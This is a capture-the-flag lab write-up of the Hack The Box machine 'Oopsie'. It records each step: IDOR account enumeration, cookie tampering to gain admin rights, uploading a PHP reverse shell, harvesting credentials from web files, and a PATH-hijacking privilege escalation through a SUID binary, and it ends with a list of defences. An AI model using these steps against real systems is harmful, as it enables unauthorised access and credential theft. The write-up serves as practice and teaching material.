# Oopsie | Easy | 2026-07-07

## Summary
Oopsie is a Linux box running Apache on port 80. Burp Suite site mapping revealed a login page under /cdn-cgi/login. Guest login exposed an IDOR (Insecure Direct Object Reference) vulnerability in the account URL parameter, revealing the Admin Access ID. Cookie manipulation using that Access ID granted superadmin access to an upload page. A PHP reverse shell was uploaded and executed, landing as www-data. Credential harvesting from web source files revealed the database password for robert. Switching to robert revealed membership in the bugtracker group. A SUID binary in that group called cat without a full path, enabling PATH hijacking to spawn a root shell.

---

## What We Didn't Know Before vs What We Know Now

| Before | After |
|--------|-------|
| Didn't know about IDOR | Insecure Direct Object Reference -- changing a URL parameter like id=2 to id=1 accesses another user's data. No authentication bypass needed, the app just trusts the parameter value |
| Didn't know what SUID meant | SUID (Set User ID) is a Linux permission bit that makes a binary run as its owner rather than the user executing it. A SUID binary owned by root runs as root regardless of who executes it |
| Didn't know about PATH hijacking | If a SUID binary calls another program without a full path, it searches $PATH for it. Placing a malicious file with the same name earlier in $PATH causes the SUID binary to execute your file as root instead |
| Didn't know groups could be a privesc vector | Linux group membership can grant access to files and binaries not available to regular users. Always check group membership with id after getting a foothold |

---

## Recon
- **Nmap command:** `nmap -p- --min-rate 5000 -T4 10.129.x.x` then `nmap -sV -sC -p 22,80 10.129.x.x`
- **Open ports / services found:**
  - `22` -- SSH (OpenSSH)
  - `80` -- HTTP (Apache 2.4.29)
- **Interesting observations:** Apache web server -- proxy through Burp to map the application

---

## Enumeration

### Burp Suite site mapping
- Configured Firefox to proxy through Burp via FoxyProxy
- Browsed the site -- Burp automatically mapped all visited pages
- Discovered login page at `/cdn-cgi/login`
- Default credentials failed -- logged in as guest
- Continued browsing as guest -- Burp expanded site map
- Discovered `/uploads` page requiring superadmin access

### IDOR -- account enumeration
- Noticed URL parameter: `accounts&id=2` (guest account)
- Changed to `id=1`:
```
http://10.129.x.x/cdn-cgi/login/admin.php?content=accounts&id=1
```
- Revealed: Access ID `34322`, name `Admin`, email `admin@megacorp.com`

### Cookie manipulation
- Opened DevTools → Application → Cookies
- Changed cookie `user` value to `34322` (Admin Access ID)
- Refreshed page -- superadmin access granted to uploads page

### Upload directory enumeration
```bash
gobuster dir -u http://10.129.x.x -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
- Discovered `/uploads/` directory -- location of uploaded reverse shell

---

## Foothold

### PHP reverse shell upload
- Downloaded webshells package, copied php-reverse-shell.php
- Modified shell to point to Kali IP and port 443
- Uploaded via the uploads page (now accessible as superadmin)

### Netcat listener
```bash
sudo nc -lvnp 443
```

### Executing the shell
- Navigated to `http://10.129.x.x/uploads/php-reverse-shell.php`
- Reverse shell connected -- landed as `www-data`

### Shell upgrade
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Spawns a fully interactive bash shell -- the raw netcat shell lacks features like tab completion and proper terminal handling.

### Credential harvesting
```bash
# Streamlined password search across all files in directory
cat * | grep -i passw*

# Check specific files
cat /var/www/html/cdn-cgi/login/db.php
```
- Found database credentials: `admin:MEGACORP_4dm1n`
- Found robert's credentials in db.php: `robert:M3g4C0rpUs3r!`

### Lateral movement to robert
```bash
su robert
# Password: M3g4C0rpUs3r!
cat /home/robert/user.txt
```

---

## Privilege Escalation

### Enumeration
```bash
# Check sudo permissions
sudo -l
# Result: robert cannot run sudo

# Check group membership
id robert
# Result: robert is in bugtracker group

# Find files owned by bugtracker group
find / -group bugtracker 2>/dev/null
# Found: /usr/bin/bugtracker

# Inspect the binary
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
# SUID bit set, owned by root
```

### SUID analysis
- Running bugtracker prompts for a bug ID
- Internally calls `cat` without a full path to display the bug file
- Relies on $PATH to find cat -- PATH hijacking vector

### PATH hijacking to root
```bash
# Create malicious cat file that spawns bash
echo '/bin/bash' > cat

# Make it executable
chmod +x cat

# Prepend current directory to PATH so our cat is found first
export PATH=$(pwd):$PATH

# Run the SUID binary -- it calls our fake cat as root
/usr/bin/bugtracker
```
- Root shell obtained

```bash
cat /root/root.txt
```

**Why this worked:** bugtracker has SUID set with root as owner -- it runs as root regardless of who executes it. Because it calls `cat` without specifying `/bin/cat`, it searches $PATH for the executable. By prepending our working directory to $PATH and placing a malicious `cat` there, bugtracker found and executed our file instead of the real cat -- running `/bin/bash` as root.

---

## Privilege Escalation Reference
- GTFOBins: https://gtfobins.github.io -- reference for SUID binary abuse and shell escapes
- PATH hijacking: when a SUID binary calls programs without full paths, search $PATH can be manipulated

---

## Tools Used
- nmap
- Burp Suite (site mapping, proxy)
- FoxyProxy
- gobuster
- PHP reverse shell (webshells package)
- Netcat
- find, chmod, echo (PATH hijacking)

## Resources
- GTFOBins: https://gtfobins.github.io
- Reverse Shell Cheat Sheet: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

---

## Key Takeaways
- **Burp site mapping** -- proxying through Burp while browsing passively builds a full site map, revealing hidden pages and endpoints not visible from the homepage
- **IDOR (Insecure Direct Object Reference)** -- always test URL parameters by incrementing/decrementing IDs. If the server returns another user's data without validation, it's IDOR -- OWASP A01:2021 Broken Access Control
- **Cookie manipulation** -- if access control is tied to a cookie value rather than server-side session validation, changing the cookie value in DevTools bypasses it. Never trust client-side values for access control decisions
- **SUID binaries** -- always check with `find / -perm -4000 2>/dev/null` after foothold. SUID means the binary runs as its owner -- if owned by root, it's a potential privesc vector
- **PATH hijacking** -- when a SUID binary calls programs without full paths, prepending a directory to $PATH lets you substitute malicious versions. The binary executes your file with its elevated privileges
- **id command** -- always run after foothold. Group membership (bugtracker, docker, disk, lxd) are common privesc vectors worth checking on GTFOBins
- **grep -i passw*** -- case-insensitive password search across files. Standard credential harvesting one-liner after getting shell access to web directories
- **python3 pty shell upgrade** -- raw Netcat shells are unstable and lack terminal features. Always upgrade immediately with `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- **What would have stopped this:**
  - Validate access control server-side, never trust client-supplied IDs or cookie values
  - Implement proper session management tied to authenticated user, not a guessable Access ID
  - Restrict file upload to non-executable file types and store outside web root
  - Remove SUID bit from binaries that don't require it
  - Always use full paths in scripts and binaries (use /bin/cat not cat)
  - Follow principle of least privilege for group membership

---

## Index Entry
| Box | Difficulty | Key Technique | CVE | Date |
|-----|------------|---------------|-----|------|
| Oopsie | Easy | IDOR + cookie manipulation + PHP shell upload + PATH hijacking | N/A | 2026-07-07 |